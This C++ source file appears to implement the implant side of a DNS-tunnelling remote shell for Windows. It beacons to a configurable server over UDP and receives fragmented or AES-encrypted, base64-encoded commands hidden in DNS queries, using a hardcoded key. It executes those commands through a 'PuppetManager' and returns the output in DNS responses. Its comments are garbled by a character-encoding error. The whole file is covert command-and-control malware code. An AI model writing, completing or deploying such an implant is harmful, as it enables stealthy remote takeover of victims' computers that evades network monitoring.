#include<iostream>
#include<vector>
#include<sstream>
#include "PuppetManager.h"
#include <string>
#include<algorithm>

#include "Dns.h"
#include "AES.h"


// �ָ��ַ�������
std::vector<std::string> split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(str);

    while (std::getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }

    return tokens;
}

// ��ȡ��ƴ���м�����ݲ��֣�����ӿո�
std::string extractAndConcatenateWithoutSpaces(const std::string& input) {
    std::vector<std::string> parts = split(input, '.');
    std::string result;

    for (size_t i = 3; i + 1 < parts.size(); ++i) { // �޸�ѭ��������ֹԽ��
        if (parts[i] == "bing") {
            break;
        }
        result += parts[i];
    }

    return result;
}

BOOL StartShell(const char* serverIP, const char* usPort) {

    std::cout << "Creating PuppetManager..." << std::endl;

    PuppetManager* puppetManager = new PuppetManager();

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    const int CMD_LEN_BUF = 4096;

    //std::vector<char> buffer(CMD_LEN_BUF);
    
    DNSHeader header{};
    header.id = htons(1234);
    header.flags = htons(0x0100);  // ��׼��ѯ
    header.questions = htons(0x01);

    TunnelRequest request;
    TunnelResponse response;
    DNS dnsQuery(header, request, response);

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(static_cast<u_short>(std::stoi(usPort)));
    inet_pton(AF_INET, serverIP, &serverAddr.sin_addr);

    // ��������
    std::string hello = "Hello,this is puppet probe!!!";

    dnsQuery.sendRequest(sock, hello, serverIP, static_cast<u_short>(std::stoi(usPort)));
    
    //DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);

    DNS dnsResponse(header, request, response);

    
    while (true) {
        // ���յ������ݰ���������̽��/��Ƭ/��ͨ����
        sockaddr_in clientAddr;
        int clientLen = sizeof(clientAddr);
        std::vector<uint8_t> buffer(CMD_LEN_BUF);

        std::cout << "�ȴ�����˷���ָ��:" << std::endl;

        //Ϊ������ڶ���ѭ����ʱ���޷�����ס
        int recvLen = recvfrom(sock, (char*)buffer.data(), buffer.size(), 0,
            (sockaddr*)&clientAddr, &clientLen);

        if (recvLen <= 0) {

            std::cerr << WSAGetLastError() << std::endl;
            continue;
        }

        // ��ȡ��ѯ���ݲ��ж�����
        std::string query = dnsQuery.extractQueryData(buffer);
        buffer.clear();

        std::cout << query << std::endl;

        // ���1��̽�뱨�ģ�������Ƭ�������̣�
        if (query.find("probe.") == 0) {
            std::vector<std::string> parts;
            std::istringstream iss(query);
            std::string part;
            while (std::getline(iss, part, '.')) parts.push_back(part);

            if (parts.size() >= 3 && parts[0] == "probe") {
                uint16_t totalFrags = static_cast<uint16_t>(std::stoi(parts[1]));
                bool isMulti = (parts[2] == "1");

                // ���÷�Ƭ���պ���������ֱ�������ʱ��
                std::map<uint16_t, std::string> fragments =
                    dnsResponse.receiveFragmentsClient2Server(sock, clientAddr);

                // ��֤��Ƭ������
                if (fragments.size() == totalFrags) {
                    
                    std::string fullCmd = dnsResponse.assembleFragments(fragments);
                    fullCmd.erase(fullCmd.find_last_not_of("\r\n") + 1);  // �����з�

                    // �����˳�����
                    if (fullCmd.substr(0, 4) == "exit") {
                        
                        std::string exitMsg = "byby dear shiyue!!!";

                        dnsResponse.sendResponse(sock, clientAddr, exitMsg);

                        std::cout << "Exit command received. Closing connection..." << std::endl;

                        break;
                    }

                    // ִ������
                    if (!fullCmd.empty() &&
                        std::any_of(fullCmd.begin(), fullCmd.end(), [](char c) {
                            return std::isprint(static_cast<unsigned char>(c));
                            })) {

                        puppetManager->setCmdList(fullCmd);
                        std::string result = puppetManager->exec();

                        // ����ִ�н��
                        if (result.empty()) {
                            result = "No output!!!";
                        }

                        dnsResponse.sendResponse(sock, clientAddr, result);
                    }
                }
                else {
                    std::cerr << "Fragment missing: "
                        << totalFrags - fragments.size()
                        << " fragments lost." << std::endl;
                }
            }
            continue;
        }

        // ���2����ͨ����ֱ�Ӵ���
        query.erase(query.find_last_not_of("\r\n") + 1);  // �����з�

        std::string key = "weiweiSecretKey123!";
        std::string command = Encrypt::decodeByAES(dnsQuery.base64Decode(extractAndConcatenateWithoutSpaces(query)),key);
        //std::string command = dnsQuery.base64Decode(extractAndConcatenateWithoutSpaces(query));

        // �����˳�����
        if (command.substr(0, 4) == "exit") {

            std::string exitMsg = "byby dear shiyue!!!";

            dnsResponse.sendResponse(sock, clientAddr, exitMsg);

            std::cout << "Exit command received. Closing connection..." << std::endl;

            break;
        }

        // ִ������
        if (!command.empty() &&
            std::any_of(command.begin(), command.end(), [](char c) {
                return std::isprint(static_cast<unsigned char>(c));
                })) {

            puppetManager->setCmdList(command);
            std::string result = puppetManager->exec();

            // ����ִ�н��
            if (result.empty()) {
                result = "No output!!!";
            }
            std::cout << "��������" << result << std::endl;

            dnsResponse.sendResponse(sock, clientAddr, result);
        }
    }

    // ������Դ
    shutdown(sock, SD_BOTH);
    closesocket(sock);
    WSACleanup();
    delete puppetManager;

    return TRUE;
}

int main(int argc, char* argv[]) {

	std::cout << "���ܶ�����!!!" << std::endl;

	/*if (3 != argc) {

		std::cout << "��������������Ҫip��ַ�Ͷ˿ں�!!!" << std::endl;

		return -1;
	}

	char* host = argv[1];
	char* port = argv[2];*/
    
    /*const char* host = "127.0.0.1";
	const char* port = "8089";*/
    const char* host = "127.000.000.001";
	const char* port = "08081";

	StartShell(host,port);

	return 0;
}